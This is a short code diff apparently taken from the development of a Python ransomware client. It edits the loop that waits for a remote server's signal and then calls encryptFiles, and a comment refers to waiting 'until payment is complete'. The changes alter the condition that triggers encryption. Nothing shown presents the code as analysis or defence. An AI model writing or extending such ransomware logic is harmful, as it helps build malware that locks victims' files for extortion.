@@ -156,18 +156,14 @@ if __name__ == "__main__":
                 data = secSock.recv(4096)
                 if not data:
                     sys.exit()
-                
                 else:
-                    
                     ''' 
                     if we recieve a 'wait', this means we have already encrypted
                     and should just wait until payment is complete
                     '''
-                    if data.decode() != 'wait':
+                    if data.decode() == 'go':
                         print("encrypting")
-                        key = data.decode()
                         encryptFiles(key)
-                    
                     # set up thread for tkinter window
                     #t1 = Thread(target=interface.App().pop_up_win)
                     #t1.daemon = True
